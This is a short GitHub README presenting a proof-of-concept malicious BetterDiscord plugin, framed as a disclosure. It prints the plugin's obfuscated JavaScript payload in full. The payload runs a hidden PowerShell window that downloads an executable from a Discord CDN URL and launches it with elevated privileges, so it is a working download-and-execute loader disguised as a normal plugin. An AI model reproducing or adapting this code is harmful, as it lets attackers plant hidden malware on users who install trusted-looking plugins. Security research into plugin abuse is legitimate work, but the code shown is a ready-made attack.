# betterdiscordmalware  
Has already been disclosed to BetterDiscord, although they responded by threatening to ban my Github and Discord, so now this POC is on a burner Github account.

Script appears as a valid BetterDiscord plugin, but acts malicously in the background. It opens a hidden powershell windows, downloads the putty executable, and runs it, all with admin privileges granted by BetterDiscord.

Here's the code that actaully does this:

```
eval(function(p,a,c,k,e,d){while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+c.toString(a)+'\\b','g'),k[c])}}return p}('r 2=6(\'7\').2;2("3.0 -8 9 $a = \'b\'; c-d e://5.g.f/i/j/k/1.0 -l \'1.0\'; 3 m-n -o \\"1.0\\"",p(q,h,4){});',28,28,'exe|putty|exec|powershell|stdErr|cdn|require|child_process|windowstyle|hidden|ProgressPreference|SilentlyContinue|Invoke|WebRequest|https|com|discordapp|stdOut|attachments|933058438462857267|933059536967856268|OutFile|Start|Process|FilePath|function|error|var'.split('|')))
```

Note: This was not made by me, and I do not take credit for the original creators work.
